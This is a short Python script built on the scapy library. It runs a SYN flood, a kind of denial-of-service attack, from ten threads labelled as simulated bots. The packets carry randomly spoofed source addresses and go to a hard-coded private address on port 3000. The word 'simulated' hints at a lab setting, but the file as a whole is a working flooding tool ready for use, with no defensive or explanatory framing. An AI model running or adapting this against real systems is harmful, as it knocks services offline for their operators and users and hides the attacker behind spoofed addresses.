from scapy.all import IP, TCP, RandIP, send
import random
import threading

def syn_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=RandIP(), dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags='S', seq=random.randint(1000, 9000))
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)

def bot_thread(target_ip, target_port, packet_count):
    syn_flood(target_ip, target_port, packet_count)

if __name__ == "__main__":
    target_ip = "192.168.254.102"
    target_port = 3000
    threads = []
    bots = 10  # Number of simulated bots
    packets_per_bot = 100

    for _ in range(bots):
        t = threading.Thread(target=bot_thread, args=(target_ip, target_port, packets_per_bot))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Simulated botnet SYN flood completed.")
